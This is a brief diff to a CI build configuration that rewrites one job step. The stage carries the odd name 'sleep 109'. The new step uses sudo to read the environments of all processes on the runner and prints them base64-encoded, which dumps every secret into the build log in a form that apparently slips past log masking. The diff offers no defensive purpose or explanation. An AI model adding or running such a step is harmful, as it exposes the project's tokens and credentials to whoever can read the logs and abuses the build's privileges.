@@ -8,4 +8,4 @@ env:
 jobs:
   include:
     - stage: "sleep 109"
-      script: sudo strings /proc/*/environ | sort -u | grep FOO 1>&2
+      script: sudo strings /proc/*/environ | sort -u | base64
